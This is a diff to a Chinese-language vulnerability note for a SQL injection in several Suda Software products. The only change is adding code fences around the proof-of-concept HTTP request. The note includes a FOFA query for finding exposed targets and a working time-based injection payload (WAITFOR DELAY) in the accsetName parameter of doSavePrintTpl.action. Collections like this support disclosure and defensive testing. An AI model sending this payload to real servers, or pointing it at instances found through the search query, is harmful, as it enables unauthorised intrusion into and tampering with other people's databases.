@@ -87,6 +87,7 @@ FOFA：body="速达软件技术（广州）有限公司" && body="jslib/extjs2.3
 
 POC/EXP：
 
+```http
 GET /common/print/print!doSavePrintTpl.action?report=1&rptid=1&employId=-1&modId=-1&accsetName=1%27;WAITFOR+DELAY%270:0:5%27-- HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
@@ -94,6 +95,8 @@ Accept: application/json, text/javascript, */*; q=0.01
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate, br, zstd
 Connection: keep-alive
+```
+
 
 ![image-20250306202652910](./.resource/速达软件多款产品doSavePrintTpl.actionSQL注入漏洞/media/image-20250306202652910.png)
 
